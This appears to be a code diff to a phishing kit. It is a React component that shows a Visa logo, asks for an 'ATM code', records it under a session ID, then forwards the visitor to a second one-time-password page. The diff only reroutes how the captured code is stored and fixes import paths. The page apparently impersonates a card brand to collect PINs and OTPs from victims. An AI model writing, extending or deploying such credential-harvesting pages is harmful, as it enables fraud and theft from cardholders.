@@ -1,17 +1,15 @@
 import { useState } from "react";
 import { useLocation } from "wouter";
-import { useSubmitAtm } from "@workspace/api-client-react";
+import { addSubmission } from "@/lib/submissions";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Loader2 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
-import imgm from "@assets/imgm_1779063055370.png";
-import visaIncLogo from "@assets/Visa_Inc._logo.svg_1779063055374.png";
+import imgm from "../assets/imgm_1779063055370.png";
+import visaIncLogo from "../assets/Visa_Inc._logo.svg_1779063055374.png";
 
 export default function Atm() {
   const [, setLocation] = useLocation();
-  const submitAtm = useSubmitAtm();
-  
   const [atmCode, setAtmCode] = useState("");
   const [loading, setLoading] = useState(false);
 
@@ -26,22 +24,12 @@ export default function Atm() {
     }
 
     setLoading(true);
-
-    submitAtm.mutate({
-      data: {
-        sessionId,
-        atmCode
-      }
-    }, {
-      onSuccess: () => {
-        setTimeout(() => {
-          setLocation("/otp2"); // Or somewhere else
-        }, 5000);
-      },
-      onError: () => {
-        setLoading(false);
-      }
-    });
+    try {
+      addSubmission("atm", sessionId, { atmCode });
+      setTimeout(() => setLocation("/otp2"), 5000);
+    } finally {
+      setLoading(false);
+    }
   };
 
   return (
